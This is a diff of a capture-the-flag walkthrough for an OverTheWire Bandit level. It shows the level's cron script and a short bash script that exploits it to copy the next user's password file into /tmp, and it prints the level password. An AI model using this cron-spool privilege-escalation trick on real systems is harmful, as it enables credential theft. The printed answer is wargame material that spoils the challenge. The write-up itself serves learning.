@@ -25,19 +25,39 @@ bandit22@bandit:/etc/cron.d$ cat cronjob_bandit24
 @reboot bandit23 /usr/bin/cronjob_bandit24.sh  &> /dev/null
 * * * * * bandit23 /usr/bin/cronjob_bandit24.sh  &> /dev/null
 ```
-Let's try to run the script.
-
-
-```
+Let's see the script :
 
 ```
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+	echo "Handling $i"
+	timeout -s 9 60 ./$i
+	rm -f ./$i
+    fi
+done
+
+```
+All we have to do is to create our own script that reads the password from /etc/bandit_pass and place it into 
+/var/spool/bandit24.
+
+```
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/IMPORTANT.txt
+```
+**NOTE:** Do not forget chmod 777.
+
+After waiting a little and reading the file we got the password.
 
 
-
-
-
-
-**Password:** jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+**Password:** UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 
 
 [Next Level](../Bandit%2024%20--%2025/README.md)
